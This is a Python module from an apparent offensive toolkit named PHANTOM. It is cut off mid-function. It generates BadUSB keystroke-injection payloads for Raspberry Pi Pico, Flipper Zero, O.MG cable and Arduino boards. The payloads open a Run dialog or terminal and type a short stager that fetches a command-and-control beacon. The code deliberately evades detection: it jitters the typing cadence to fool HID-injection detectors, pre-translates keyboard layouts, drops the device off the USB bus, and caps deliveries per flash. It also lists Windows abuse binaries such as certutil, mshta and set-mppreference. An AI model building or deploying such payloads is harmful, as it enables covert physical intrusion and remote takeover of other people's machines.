"""hid_builder.py — the USB HID delivery vector (9.1 / 9.2).

AutoRun on removable volumes has been disabled by Windows at the OS level
for years, so "drop a USB stick and wait" is not a vector: a mass-storage
device cannot be relied on to execute anything. What still works is a board
that PRESENTS ITSELF AS A KEYBOARD and types the payload into whatever
machine it is plugged into:

* ``pico``    — RP2040 / Raspberry Pi Pico running CircuitPython
                (``adafruit_hid``): the artefact is a ``main.py``;
* ``flipper`` — Flipper Zero BadUSB: a DuckyScript file;
* ``omg``     — O.MG cable web UI: DuckyScript as well, with its own
                replay/timing extensions;
* ``arduino`` — an Arduino-IDE board (ATmega32U4 / CH552 / ESP32 class)
                running the bundled ``Keyboard`` library: the artefact is a
                ``.ino`` sketch. These boards have far less flash than a
                CircuitPython Pico, which is fine: the payload is the TYPED
                COMMAND, and the beacon it launches is downloaded from the
                C2, never stored on the board.

The board carries firmware and the typed command, and nothing else. A
scant-flash board (tens of KB) is enough for exactly that reason: the
typed command is a short launcher for the resilient stager, so it works
when the C2 is not up yet — the stager retries by itself.

WHY THE OPERATOR CHOOSES (9.2): the same typed instruction cannot run on
every OS (a PowerShell one-liner is a syntax error on ``sh``, and PE ≠ ELF
≠ Mach-O for the binary it downloads), and there is no way for the board to
detect the target OS before executing — it types into whatever it is
plugged into. So the board, the target family and the command are explicit
operator choices, and this module's job is to make that choice precise,
warn about the mismatches it CAN see (a Windows Run-dialog keystroke on a
Linux target) and never to guess.

THE SECOND HALF OF "THE TARGET IS EXPLICIT" IS THE LAYOUT. A keystroke
injector sends HID usage codes; the target OS turns those into characters
with whatever layout it has active. Every table these boards ship
(``Keyboard.print``, ``KeyboardLayoutUS``, DuckyScript ``STRING``) is US, so
on an Italian target ``/`` and ``(`` — and ``{}``/``@``/``#`` behind AltGr —
come out as the wrong character. ``--layout it`` pre-translates the command
(``hid_layouts``) so the US codes sent are the ones an Italian keyboard maps
back to what we meant, and types AltGr-only characters as explicit key
combinations where the board can.

THE RHYTHM IS PART OF THE ARTEFACT. A board at full speed types a 260-char
stager in a fraction of a second; no human does, and a HID-injection detector
that measures inter-keystroke timing sees it for free. So the command is typed
in BURSTS with a jittered pause after each one (``DEFAULT_CHAR_DELAY_MS``):
still fast enough to watch, not a metronome. It is a cost, not a trick — the
artefact takes ~4 s to type instead of ~0.3 s — and it is the only piece of
the detection problem that lives in this layer at all. What an EDR reads off
the CONTENT of the typed command (AMSI, Script Block logging, a signature on
``iex`` + a download) is a loader problem, and this module cannot fix it by
typing the same bytes more slowly.

Pure text generation: no I/O, no flashing, nothing writes a file here. The
``payload hid`` command writes what this returns.
"""

from __future__ import annotations

import hashlib
import math
import random
import re
from dataclasses import dataclass
from typing import List, Optional, Sequence, Tuple

from phantom.utils.hid_layouts import (
    HID_LAYOUTS,
    is_strict,
    normalize_layout,
    segments,
    special_key_chars,
    translate_text,
    unsupported_chars,
)

BOARDS = ("pico", "flipper", "omg", "arduino")

# boards whose artefact is DuckyScript (the two hardware keystroke injectors
# that ship on the operator's bench)
DUCKYSCRIPT_BOARDS = ("flipper", "omg")

# boards whose artefact is an Arduino-IDE sketch using the bundled
# ``Keyboard`` HID library (ATmega32U4 / CH552 / ESP32-class boards that
# present themselves as a keyboard). These have nowhere near the flash of a
# CircuitPython Pico, so they cannot carry the beacon either — the typed
# command is the whole payload, and it points at the C2 the beacon comes
# from.
ARDUINO_BOARDS = ("arduino",)

# The operator's board has a NAME (what is written on the thing they plugged
# in) and a FAMILY (which generator and which toolchain it needs). A Leonardo
# is an Arduino-IDE ``Keyboard.h`` board like any other; the variant only
# matters for the FQBN the flasher has to pass (``arduino_flash.fqbn_for``).
# Without this table the Leonardo was simply "unknown board" even though its
# FQBN is already in the flasher's map.
BOARD_ALIASES = {
    "leonardo": "arduino",
    "micro": "arduino",
    "pro-micro": "arduino",
    "promicro": "arduino",
    "atmega32u4": "arduino",
}

# every name the CLI accepts: the families, then the variants
ALL_BOARD_NAMES = BOARDS + tuple(BOARD_ALIASES)


def canonical_board(board: str) -> str:
    """The board FAMILY behind a name (``leonardo`` -> ``arduino``)."""
    name = (board or "").strip().lower()
    return BOARD_ALIASES.get(name, name)

# How to open a place to type the command, per target family. The board is a
# keyboard: it can only hit the chord that opens a console on EACH family, so
# "universal" means "one chord per target", not "one chord for all". A step is
# ("keys", names) — press these together and release; ("tap", name) — press and
# release one key; ("text", s) — type a word.
_OPENERS = {
    "windows": (("keys", ("GUI", "R")),),
    "linux": (("keys", ("CTRL", "ALT", "T")),),
    "macos": (
        ("keys", ("GUI", "SPACE")),
        ("text", "terminal"),
        ("tap", "ENTER"),
    ),
}

_OPENER_LABELS = {
    "windows": "run dialog (Win+R)",
    "linux": "terminal (Ctrl+Alt+T, the GNOME-family shortcut)",
    "macos": "Spotlight (Cmd+Space), typing 'terminal' to open the console",
}

# logical key name -> the token each generator prints
_DUCKY_KEY = {
    "GUI": "GUI", "CTRL": "CTRL", "ALT": "ALT", "SHIFT": "SHIFT",
    "ENTER": "ENTER", "SPACE": "SPACE", "R": "R", "T": "T",
}

_ARDUINO_KEY = {
    "GUI": "KEY_LEFT_GUI", "CTRL": "KEY_LEFT_CTRL", "ALT": "KEY_LEFT_ALT",
    "SHIFT": "KEY_LEFT_SHIFT", "ENTER": "KEY_RETURN", "SPACE": "' '",
    "R": "'r'", "T": "'t'",
}

_PICO_KEY = {
    "GUI": "Keycode.GUI", "CTRL": "Keycode.CONTROL", "ALT": "Keycode.ALT",
    "SHIFT": "Keycode.LEFT_SHIFT", "ENTER": "Keycode.ENTER",
    "SPACE": "Keycode.SPACEBAR", "R": "Keycode.R", "T": "Keycode.T",
}

DEFAULT_DELAY_MS = 1500

#: Seconds between power-up and the first keystroke, with the LED blinking once
#: per second. This is not pacing: the board is plugged into the operator's own
#: machine to be written, and it must be UNPLUGGED and carried before it types.
#:
#: 15 s was for the workflow where the board was FLASHED IN PLACE and the
#: operator had to watch it type here, ready to unplug it at the right moment.
#: That workflow is gone: the default is now one-shot per flash (the board that
#: already delivered stays silent) and the first boot after a flash never types
#: at all, so there is nothing to be rescued from. The countdown was left as
#: the only delay between plugging into the TARGET and the keystrokes, and 15 s
#: standing in front of the target is the most exposure for the least reason —
#: measured 2026-11-01 as "too slow, it looks stuck". Five seconds on top of the
#: 1.5 s enumeration is enough to see the board enumerate and get the target
#: focused; `--countdown` still takes any value.
DEFAULT_COUNTDOWN_S = 3

#: How many DELIVERIES one flash is worth. Each successful power-up on a
#: target spends one; when the last one is spent the board stays silent for
#: ever (until re-flashed), so carrying it home does not re-inject there.
#:
#: Why not 1: a board that types exactly once is a board you must re-flash on
#: the bench every time you need a second shell, and the operator cannot
#: re-flash from inside the target's room. Why not unlimited: the machine the
#: board comes back to is the machine that flashed it, and an armed keyboard
#: left in a drawer is the accident the counter exists to prevent. 3 is "one
#: for the box, two spares"; ``0`` means unlimited (`--repeat`).
#: 3 is "one for the box, two spares"; ``0`` means unlimited (`--repeat`).
#:
#: The default stays above one on purpose (measured 2026-11-01: a one-shot
#: board is spent after the first shell and cannot be re-flashed from inside
#: the target's room). The cost is the opposite failure, measured 2026-11-02:
#: the board came back from the lab and typed the payload into a terminal on
#: the operator's own machine, because NOTHING in the firmware can tell two
#: hosts apart. That is an operator choice, not a default: flash with
#: ``--shots 1`` for a board that travels home, and re-flash for a second
#: delivery.
DEFAULT_SHOTS = 3

#: Average milliseconds per typed character: 6 ms is ~165 chars/s, which on the
#: 231-char stager is ~1.4 s of visible typing on top of the countdown.
#:
#: The history of this number is the history of the complaint: 90 ms (21 s, read
#: as a hung board) → 15 ms (4 s, still "slow") → 10 ms (2.4 s) → 6 ms. Speed
#: is not free: under ~8 ms/char a host starts dropping SHIFTED keystrokes, and
#: that was the ``ç`` bug. What makes 6 safe is the burst LENGTH, not the delay:
#: ``_MAX_BURST`` is 4, so no single ``Keyboard.print`` ever emits more than
#: four characters back-to-back and every burst is followed by a real pause.
#: ``0`` disables it (a burst of the whole command — the loudest and least
#: reliable setting).
DEFAULT_CHAR_DELAY_MS = 6

#: Below this length a command is typed in ONE burst: slowing down six
#: characters buys nothing and only widens the window in which focus can move.
CADENCE_MIN_CHARS = 40

#: Upper bound on the number of PAUSES in one artefact. The chunk size grows
#: with the command instead, because the constraint on an ATmega-class board
#: is flash: an 11k inline command must not become thousands of print sites.
_MAX_PAUSES = 120

#: Longest single ``Keyboard.print`` burst. Inside a burst the board emits its
#: reports at full USB speed, so the pause AFTER the burst is the only pacing
#: the host sees; a 8-key burst at a fast cadence is where shifted characters
#: start disappearing (the same class of defect that produced ``ç`` for ``.``).
#: Four keys per burst keeps the reports short enough for every host and still
#: turns a 231-char stager into ~58 pauses, i.e. one per 24 ms.
_MAX_BURST = 4

# A keystroke injector types the command ON SCREEN. It has to be short
# enough that the operator can afford to watch it (and that a board with a
# per-line/per-file script cap can hold it). The C2 stager is the short
# form; a hand-pasted one-liner may not be, and that is worth saying out
# loud instead of emitting a 11k-char artefact in silence.
LONG_COMMAND_CHARS = 1024

# Words that exist on ONE family only. They are matched as WHOLE TOKENS, never
# as substrings: `apt` inside `adapt` is not a signal, and `-enc` is a flag
# rather than a word. This is a READ-ONLY heuristic with two consumers — the
# note printed on the artefact, and the confirmation `payload hid` asks before
# writing — and it never blocks on its own.
POSIX_ONLY_TOKENS = frozenset((
    "sh", "bash", "dash", "zsh", "ksh", "chmod", "chown", "chattr",
    "setfacl", "sudo", "apt", "apt-get", "apt-key", "dpkg", "yum", "dnf",
    "pacman", "zypper", "apk", "systemctl", "service", "journalctl",
    "crontab", "useradd", "adduser", "usermod", "groupadd", "passwd",
    "pkill", "killall", "iptables", "nft", "ufw", "firewall-cmd", "nohup",
    "strace", "modprobe", "insmod", "sysctl", "chkconfig", "ldd",
))

WINDOWS_ONLY_TOKENS = frozenset((
    "powershell", "pwsh", "cmd", "cmd.exe", "regsvr32", "rundll32",
    "mshta", "bitsadmin", "certutil", "schtasks", "wevtutil", "vssadmin",
    "icacls", "takeown", "reg", "wmic", "netsh", "taskkill", "sc.exe",
    "cscript", "wscript", "nltest", "dsquery", "set-mppreference",
    "-enc", "-encodedcommand",
))

# whitespace and every shell separator: the words, not the punctuation
_TOKEN_SPLIT = re.compile("[\\s;|&()<>\"'`=]+")


def command_tokens(command: str) -> Tuple[str, ...]:
    """The command's words, split on whitespace and shell separators."""
    return tuple(t for t in _TOKEN_SPLIT.split((command or "").strip().lower())
                 if t)


def command_family(command: str) -> Tuple[str, str]:
    """``(family, token)`` — which OS family the command's words belong to.

    ``("", "")`` when nothing recognisable appears. Windows wins when a
    command carries both: a PowerShell one-liner that shells out to ``bash``
    is still a Windows command, and reporting it as POSIX would be worse than
    saying nothing.
    """
    tokens = set(command_tokens(command))
    windows = sorted(tokens & WINDOWS_ONLY_TOKENS)
    if windows:
        return "windows", windows[0]
    posix = sorted(tokens & POSIX_ONLY_TOKENS)
    if posix:
        return "posix", posix[0]
    return "", ""


def mismatch_hints(command: str, target: str) -> Tuple[str, ...]:
    """One sentence per sign that the typed command belongs to another OS.

    ``target`` is the OS the board types INTO. A shell command is text, so
    this is a SUGGESTION the operator may overrule (``--strict`` refuses
    instead of asking) — never a verdict.
    """
    target = (target or "").strip().lower()
    if not target:
        return ()
    family, token = command_family(command)
    if family == "posix" and target == "windows":
        return ("the command looks POSIX but the target is Windows "
                f"({token!r} is a POSIX-only command)",)
    if family == "windows" and target != "windows":
        return (f"the command looks Windows but the target is {target} "
                f"({token!r} is a Windows-only command)",)
    return ()


@dataclass(frozen=True)
class HidPayload:
    """One flashable/writable artefact plus the caveats the operator needs."""

    board: str
    filename: str
    content: str
    target: str = ""
    layout: str = "us"
    notes: Tuple[str, ...] = ()

    @property
    def lines(self) -> int:
        return len([l for l in self.content.splitlines() if l.strip()])

    def summary(self) -> str:
        head = f"{self.board} HID payload -> {self.filename} ({self.lines} lines)"
        if self.target:
            head += f" for {self.target} targets"
        if self.layout != "us":
            head += f" ({self.layout} layout)"
        return " | ".join((head,) + tuple(self.notes))


def _opener_gap(delay_ms: int) -> int:
    return min(500, max(100, int(delay_ms) // 3))


def _c_escape(text: str) -> str:
    """Escape a string for a C literal: backslash then the closing quote."""
    return text.replace("\\", "\\\\").replace('"', '\\"')


def _cadence_seed(text: str) -> int:
    """A seed derived from the text, so the same command types the same way.

    Random pauses that differ between two generations of the same artefact
    would make the output untestable and would not be more human: a human
    typing the same line twice also has a rhythm.
    """
    return int(hashlib.sha256((text or "").encode("utf-8")).hexdigest()[:8], 16)


def _cadence_pieces(text: str, char_delay_ms: int) -> List[Tuple[str, int]]:
    """``[(chunk, pause_ms), ...]`` — the text as bursts a human would type.

    A short command comes back as ONE piece with no pause (the artefact is
    byte-identical to the un-cadenced one), because slowing down six
    characters is not stealth, it is just a longer window for focus to move.

    The pause after each burst is jittered (±) and clamped: a constant gap is
    as synthetic as no gap at all, and a 92-char burst multiplied by a slow
    cadence must not park the board for half a minute mid-command.
    """
    text = text or ""
    if not text:
        return []
    delay = max(0, int(char_delay_ms))
    if delay == 0 or len(text) < CADENCE_MIN_CHARS:
        return [(text, 0)]

    # The pause after a burst IS the cadence: ``Keyboard.print`` emits its
    # keys back-to-back, so what a detector measures is this delay divided by
    # the chunk. Bursts therefore stay small (a couple of keys), and a very
    # long command grows the chunk instead of the number of pauses — an 11k
    # inline artefact on a 28 KB board cannot afford thousands of print
    # sites, and it is the one case where looking machine-fast is the lesser
    # problem.
    size = max(1, min(_MAX_BURST,
                      math.ceil(len(text) / float(_MAX_PAUSES))))
    rng = random.Random(_cadence_seed(text))
    pieces: List[Tuple[str, int]] = []
    for start in range(0, len(text), size):
        chunk = text[start:start + size]
        pause = int(delay * len(chunk) * rng.uniform(0.6, 1.5))
        pieces.append((chunk, min(pause, 2000)))
    return pieces


def _arduino_print(text: str, char_delay_ms: int) -> List[str]:
    """One ``Keyboard.print`` per burst, with the pause between bursts."""
    body: List[str] = []
    for chunk, pause in _cadence_pieces(text, char_delay_ms):
        body.append(f'  Keyboard.print(F("{_c_escape(chunk)}"));')
        if pause:
            body.append(f"  delay({pause});")
    return body


def _pico_print(text: str, char_delay_ms: int) -> List[str]:
    """One ``layout.write`` per burst, with the pause between bursts."""
    body: List[str] = []
    for chunk, pause in _cadence_pieces(text, char_delay_ms):
        body.append(f"layout.write({chunk!r})")
        if pause:
            body.append(f"time.sleep({pause / 1000.0:.3f})")
    return body


def _duckyscript(command: str, *, delay_ms: int, press_enter: bool,
                 opener: Sequence[tuple], layout: str,
                 countdown_s: int = 0) -> str:
    lines = ["REM PHANTOM HID payload — types one command, then presses Enter",
             "REM flash/write this to the board; nothing executes on the "
             "operator box",
             f"DELAY {max(0, int(delay_ms))}"]
    if int(countdown_s) > 0:
        # A second DELAY on its own line, never added to the first: an operator
        # looking for "did the enumeration delay survive" must still find it.
        lines += ["REM countdown: unplug from the machine that wrote this and "
                  "carry it before the keystrokes start",
                  f"DELAY {max(0, int(countdown_s)) * 1000}",
                  "REM NOTE: DuckyScript cannot carry the first-boot guard — "
                  "this device types on the machine that wrote it too"]
    for step in opener:
        kind = step[0]
        if kind == "keys":
            names = tuple(step[1])
            lines.append("REM open: " + " + ".join(_DUCKY_KEY[n] for n in names))
            lines.append("HOLD " + " ".join(_DUCKY_KEY[n] for n in names))
            # RELEASE matters: HOLD leaves the modifiers down and the next
            # STRING (or the typed command) would come out as shortcuts
            lines.append("RELEASE")
        elif kind == "tap":
            lines.append(_DUCKY_KEY[step[1]])
        elif kind == "text":
            lines.append("STRING " + step[1])
        lines.append(f"DELAY {_opener_gap(delay_ms)}")
    # STRING types the command verbatim; a leading SPACE would be typed too,
    # so the command is emitted on its own token
    lines.append("STRING " + translate_text(command, layout))
    if press_enter:
        lines.append("DELAY 200")
        lines.append("ENTER")
    return "\n".join(lines) + "\n"


def _arduino_opener(opener: Sequence[tuple], delay_ms: int) -> list:
    body = []
    gap = _opener_gap(delay_ms)
    for step in opener:
        kind = step[0]
        if kind == "keys":
            body.append("  // open: " + " + ".join(step[1]))
            # ONE KEY PER REPORT, with air between them. Pressing GUI and 'r'
            # in the same instant and releasing immediately is a race inside
            # the host's HID parser: measured 2026-11-02 on the lab HP, the
            # board opened the Start menu and never typed the 'r' — the chord
            # degraded to a single GUI tap, so the whole payload landed in
            # whatever had focus.
            for name in step[1]:
                body.append(f"  Keyboard.press({_ARDUINO_KEY[name]});")
                body.append("  delay(60);  // its own report, not a chord race")
            body.append("  Keyboard.releaseAll();")
            body.append(f"  delay({gap});")
        elif kind == "tap":
            body.append(f"  Keyboard.press({_ARDUINO_KEY[step[1]]});")
            body.append("  Keyboard.releaseAll();")
            body.append(f"  delay({gap});")
        elif kind == "text":
            body.append(f'  Keyboard.print(F("{_c_escape(step[1])}"));')
            body.append(f"  delay({gap});")
    if body:
        # The opener asked the host to CREATE a window (Run, a console).
        # Typing into it in the same breath as the release is how the first
        # characters vanish while the dialog is still being created — the
        # operator sees a command that starts mid-word.
        body.append("  delay(900);  // let the window the opener asked for "
                    "exist before typing")
    return body


def _arduino_typing(command: str, layout: str,
                    char_delay_ms: int = DEFAULT_CHAR_DELAY_MS) -> list:
    body = []
    # In bursts the command is no longer ONE readable print, and an operator
    # who eyes the sketch before flashing (or greps it) must still find the
    # exact text that will be typed. A comment costs no flash.
    if len(_cadence_pieces(command, char_delay_ms)) > 1:
        body.append("  // typed below in bursts, at a human cadence. Full text:")
        body.append("  //   " + command.replace("\r", " ").replace("\n", " "))
    if layout == "us":
        body.append("  // the command, typed verbatim (F() keeps it in flash, "
                    "not RAM)")
        body += _arduino_print(command, char_delay_ms)
        return body
    for segment in segments(command, layout):
        if segment.kind == "print":
            body += _arduino_print(segment.text, char_delay_ms)
            continue
        mods = []
        if segment.altgr:
            mods.append("KEY_RIGHT_ALT")
        if segment.shift:
            mods.append("KEY_LEFT_SHIFT")
        why = "AltGr" if segment.altgr else "non-US"
        body.append(f"  // {why} key, HID usage 0x{segment.usage:02X}")
        for mod in mods:
            body.append(f"  Keyboard.press({mod});")
            body.append("  delay(6);  // the modifier goes out in its own "
                    "report")
        # 136 + usage is the only way to press a RAW HID usage. Keyboard.press()
        # treats anything below 0x80 as an ASCII character and maps it through
        # its US table, so `press(0x2F)` did not press the `[` key: 0x2F is
        # ASCII `/`, i.e. usage 0x38. Every AltGr character therefore came out
        # as AltGr + the wrong key — `{`, `}`, `@`, `#` typed nothing at all —
        # while the sketch looked correct. The library reserves >= 136 for
        # "non-printing key, subtract 136 to get the usage".
        body.append(f"  Keyboard.press(136 + 0x{segment.usage:02X});"
                    "  // raw HID usage, not ASCII")
        # A combo followed immediately by the next burst is what turned `.`
        # into `ç` on an Italian target (2026-11-01): the host polled the
        # release and the following key inside one frame and kept the modifier
        # down. Three frames of air after the release cost ~20 ms per combo and
        # remove the whole class of "the right key, the wrong character".
        body.append("  delay(10);  // hold across the host's poll frame")
        body.append("  Keyboard.releaseAll();")
        body.append("  delay(18);  // and let the next burst start clean")
    return body


def _build_tag(command: str, board: str, layout: str,
               nonce: str = "") -> int:
    """A 32-bit per-build nonce the FIRMWARE carries and EEPROM does not.

    It is written to EEPROM on the first boot and compared on every later one,
    so "has this sketch ever run?" is answerable on the board with no handshake
    and no host-side cooperation. Derived from the artefact's own content, so
    the same payload generates the same tag and two generations stay
    byte-identical.

    ``nonce`` is what makes a RE-FLASH visible to the board. The tag was
    content-only, so flashing the SAME artefact again produced the SAME tag:
    ``justFlashed()`` answered false, the one-shot byte set by the previous
    delivery was never cleared, and the board stayed mute for ever — measured
    2026-11-01, when a freshly reflashed board typed nothing on the target.
    The flasher now passes a per-flash nonce, so "a new build" is true for
    every upload and the spent marker resets exactly once per flash. An empty
    nonce keeps generation deterministic (tests, and two artefacts built from
    the same inputs).
    """
    digest = hashlib.sha256(
        f"{board}|{layout}|{nonce}|{command}".encode("utf-8")).hexdigest()
    return int(digest[:8], 16)


def _arduino_first_boot_guard(tag: int, shots: int = 1) -> list:
    """The sketch half of "never type on the machine that just flashed you".

    EEPROM survives a re-upload (avrdude writes flash, not EEPROM) while the
    firmware does not, so a stored tag that differs from the compiled one can
    only mean this sketch has never executed. The first boot after an upload is
    therefore SILENT — that boot happens while the board is still plugged into
    the operator's machine — and the NEXT power-up (which is the target) types.

    The "already delivered" guard is a COUNTER, not a flag: the sketch is
    flashed with ``shots`` deliveries (0 = unlimited). Each power-up that is
    about to type decrements it, and when it reaches zero the board stays
    silent for ever — that is what stops the machine the board is carried
    back to from being injected a second time, without making the board
    useless after its first shell.
    """
    shots = max(0, int(shots))
    body = [
        "// FIRST BOOT AFTER A FLASH IS SILENT.",
        "// EEPROM survives a re-upload, flash does not: a tag that does not",
        "// match means this sketch has never run — i.e. the machine that just",
        "// wrote it. Stay quiet there and fire on the next power-up.",
        f"static const uint32_t BUILD_TAG = 0x{tag:08X}UL;",
        "static const uint8_t TAG_ADDR = 0;",
    ]
    if shots > 0:
        body += [
            f"// SHOTS LEFT: {shots} deliveries per flash (--shots). The byte",
            "// is decremented before each delivery, so a board that already",
            "// spent them all stays silent on every later power-up — bringing",
            "// it home does not re-inject. Re-flashing resets it.",
            f"static const uint8_t SHOTS = {shots};",
            "static const uint8_t SHOT_ADDR = 4;",
        ]
    body += [
        "",
        "static bool justFlashed() {",
        "#if defined(__AVR__)",
        "  uint32_t stored = 0;",
        "  for (uint8_t i = 0; i < 4; i++) {",
        "    stored = (stored << 8) | EEPROM.read(TAG_ADDR + i);",
        "  }",
        "  if (stored == BUILD_TAG) return false;",
        "  for (uint8_t i = 0; i < 4; i++) {",
        "    EEPROM.write(TAG_ADDR + i,",
        "                 (uint8_t)((BUILD_TAG >> (8 * (3 - i))) & 0xFF));",
        "  }",
    ]
    if shots > 0:
        body += ["  EEPROM.write(SHOT_ADDR, SHOTS);  // a new build starts armed"]
    body += [
        "  return true;",
        "#else",
        "  return false;  // no EEPROM on this MCU: the guard is absent, and",
        "                 // the artefact says so instead of pretending",
        "#endif",
        "}",
        "",
    ]
    if shots > 0:
        body += [
            "static bool outOfShots() {",
            "#if defined(__AVR__)",
            "  return EEPROM.read(SHOT_ADDR) == 0;",
            "#else",
            "  return false;",
            "#endif",
            "}",
            "",
            "static void markTyped() {",
            "#if defined(__AVR__)",
            "  uint8_t left = EEPROM.read(SHOT_ADDR);",
            "  if (left > 0) EEPROM.write(SHOT_ADDR, (uint8_t)(left - 1));",
            "#endif",
            "}",
            "",
        ]
    return body


def _arduino_usb_eject() -> list:
    """The sketch half of "do not leave a live keyboard behind".

    ``UDCON``'s ``DETACH`` bit clears the D+ pull-up, so the HOST sees an
    unplug while the board keeps running on VBUS. That is the difference
    between a device that sits in the room as an armed keyboard and a device
    that looks like it was taken away: nothing types again until the next
    power-up, and a power-up is what the operator does on purpose when moving
    it to the target.
    """
    return [
        "// EJECT: clear the USB D+ pull-up. The host sees an unplug while",
        "// the board keeps running on VBUS, so it is not left attached as a",
        "// live keyboard. Nothing re-attaches it until the next power-up.",
        "static void usbEject() {",
        "#if defined(__AVR__)",
        "  UDCON |= (1 << DETACH);",
        "#endif",
        "}",
        "",
    ]


def _arduino_countdown(seconds: int) -> list:
    """A visible countdown: the LED blinks once per second before typing."""
    return [
        "// COUNTDOWN: one blink per second, then it types. This is the window",
        "// to unplug the board from the machine that wrote it.",
        "static void countdown(uint8_t seconds) {",
        "  for (uint8_t i = 0; i < seconds; i++) {",
        "    digitalWrite(LED_PIN, HIGH);",
        "    delay(120);",
        "    digitalWrite(LED_PIN, LOW);",
        "    delay(880);",
        "  }",
        "}",
        "",
    ]


def _sketch_boot_gate(countdown_s: int, first_boot_safe: bool,
                      eject: bool = False, shots: int = 1,
                      rescue_serial: bool = True) -> list:
    """The two lines of ``setup()`` that keep the board off THIS machine.

    With ``eject`` the silent branch also drops the board off the host: the
    machine that just wrote this sketch does not merely get ignored, the
    keyboard disappears from it. That is what lets the countdown stop being the
    only answer to "do not type here by accident".

    ``shots`` adds the second silent branch: a board whose counter reached
    zero stays quiet for ever (until re-flashed), because the machine it comes
    back to is the one that flashed it.
    """
    body: list = []
    # A silent branch KEEPS THE BOARD ATTACHED when the serial rescue is on.
    # Ejecting there is what made the board a brick for reflashing: no port, no
    # 1200-baud touch, no upload — only a wire on the reset pin, which is not
    # something an operator should ever need. The keyboard is silent in these
    # branches anyway (that is what the branch means), so attached-but-mute
    # costs nothing operational.
    if first_boot_safe:
        body += [
            "  if (justFlashed()) {",
            "    // the machine that just wrote this sketch: stay silent",
        ]
        if eject and not rescue_serial:
            body.append("    usbEject();  // and leave this machine")
        body += [
            "    return;",
            "  }",
        ]
    if shots > 0:
        body += [
            "  if (outOfShots()) {",
            "    // spent: every delivery this flash carried has been made, so",
            "    // the machine it was carried back to must not see a payload",
        ]
        if eject and not rescue_serial:
            body.append("    usbEject();")
        body += [
            "    return;",
            "  }",
        ]
    if int(countdown_s) > 0:
        body.append(f"  countdown({max(0, int(countdown_s))});"
                    "  // window to unplug and carry it")
    return body


def _arduino_sketch(command: str, *, delay_ms: int, press_enter: bool,
                    opener: Sequence[tuple], layout: str,
                    arm: bool = False, arm_pin: int = 7,
                    char_delay_ms: int = DEFAULT_CHAR_DELAY_MS,
                    countdown_s: int = DEFAULT_COUNTDOWN_S,
                    first_boot_safe: bool = True,
                    build_tag: Optional[int] = None,
                    eject: bool = False,
                    shots: int = DEFAULT_SHOTS,
                    rescue_serial: bool = True,
                    build_nonce: str = "") -> str:
    """An Arduino-IDE sketch for a RAM-constrained keystroke board.

    ``Keyboard.print`` reads the command from PROGMEM (``F(...)``), so an
    11k-char command does not have to fit in the ~2.5 KB SRAM an ATmega32U4
    has — it only has to fit in flash, which it does. This is why a 42 KB
    board is enough for the stager: the beacon is never on the board.

    With ``arm`` the board types NOTHING until the operator arms it with a
    button on ``arm_pin``. That buys a real property — a board that fires on
    power-up will happily type on the machine you are flashing it from, which
    is not a rare accident, it is the default loop. But it costs a wired
    button, and the deployment this tool is built for is flash once, unplug,
    carry, plug into the target. So arming is opt-in: the safe-in-the-field
    mode is the one you choose deliberately, not the one you inherit.

    With ``eject`` the board additionally stops being a keyboard when it is
    done — and, on the first boot after a flash, instead of typing at all. The
    two halves answer the same complaint: a board that types and then sits
    there is a second injection waiting for whoever presses a key.
    """
    body = [
        "// PHANTOM HID payload — Arduino-IDE keystroke board (Keyboard.h).",
        "// Flash with the Arduino IDE: the board presents itself as a",
        "// keyboard and types ONE command, then presses Enter.",
    ]
    if layout != "us":
        body.append(f"// target keyboard layout: {layout} (US codes "
                    f"pre-translated)")
    # the shot counter needs the EEPROM tag beside it, and both need the same
    # include: a board with --no-first-boot-safe has nowhere to keep the marker
    shots = max(0, int(shots)) if first_boot_safe else 0
    body += ["#include <Keyboard.h>", ""]
    if rescue_serial:
        body += [
            "// SERIAL RESCUE: opening a CDC port is the only software way back",
            "// into a sketch that never types again. `arduino-cli upload` (and",
            "// the Arduino IDE) open this port at 1200 baud, which is the",
            "// signal the Caterina bootloader waits for: a reflash then needs",
            "// NO wire on the reset pin. Cost: the board enumerates as HID +",
            "// CDC instead of HID only, and after it has DELIVERED it stays",
            "// attached — silent — so it can be reflashed.",
        ]
    if first_boot_safe:
        body.append("#if defined(__AVR__)")
        body.append("#include <EEPROM.h>")
        body.append("#endif")
    if eject:
        # UDCON/DETACH live in the AVR headers, and only an AVR board has them:
        # a non-AVR board gets the guard, not a compile error.
        body.append("#if defined(__AVR__)")
        body.append("#include <avr/io.h>")
        body.append("#endif")
    body += ["", "static const uint8_t LED_PIN = LED_BUILTIN;", ""]
    if first_boot_safe:
        body += _arduino_first_boot_guard(
            int(build_tag if build_tag is not None
                else _build_tag(command, "arduino", layout, build_nonce)),
            shots=shots)
    if eject:
        body += _arduino_usb_eject()
    if countdown_s > 0:
        body += _arduino_countdown(max(0, int(countdown_s)))
    if arm:
        body += [
            "// SAFETY: two presses are required to fire. Plug the board in",
            "// and it stays idle — it must not type on the machine you are",
            "// sitting at. Wire a momentary button between ARM_PIN and GND.",
            f"static const uint8_t ARM_PIN = {int(arm_pin)};",
            "",
            "// One full press+release cycle. A button stuck down (or shorted",
            "// to GND) never returns, so a faulty switch fails SAFE: the board",
            "// stays silent instead of typing into the wrong machine.",
            "static void waitPress() {",
            "  while (digitalRead(ARM_PIN) != LOW) delay(10);",
            "  while (digitalRead(ARM_PIN) == LOW) delay(10);",
            "  delay(60);",
            "}",
            "",
            "void setup() {",
            "  pinMode(ARM_PIN, INPUT_PULLUP);",
            "  pinMode(LED_PIN, OUTPUT);",
            "  digitalWrite(LED_PIN, LOW);  // dark = not armed",
            "",
            f"  delay({max(0, int(delay_ms))});  // host enumerates the HID device",
            "  Keyboard.begin();",
            "",
        ]
        if rescue_serial:
            body += ["  Serial.begin(115200);  // the way back in (1200-baud "
                     "touch)"]
        body += _sketch_boot_gate(countdown_s, first_boot_safe,
                                  eject=eject, shots=shots,
                                  rescue_serial=rescue_serial)
        body += [
            "  waitPress();                   // 1st press: arm",
            "  digitalWrite(LED_PIN, HIGH);  // lit = armed, safe to position",
            "  waitPress();                   // 2nd press: fire",
        ]
        if shots > 0:
            body.append("  markTyped();  // one shot spent, re-flash for more")
    else:
        body += [
            "// SAFETY ARMING NOT USED (default): this board types as soon as",
            "// it is powered, which is why the countdown and the first-boot",
            "// guard below exist. Use --arm for a physical two-press gate.",
            "void setup() {",
            "  pinMode(LED_PIN, OUTPUT);",
            "  digitalWrite(LED_PIN, LOW);",
            f"  delay({max(0, int(delay_ms))});  // host enumerates the HID device",
            "  Keyboard.begin();",
        ]
        if rescue_serial:
            body += ["  Serial.begin(115200);  // the way back in (1200-baud "
                     "touch)"]
        body += _sketch_boot_gate(countdown_s, first_boot_safe,
                                  eject=eject, shots=shots,
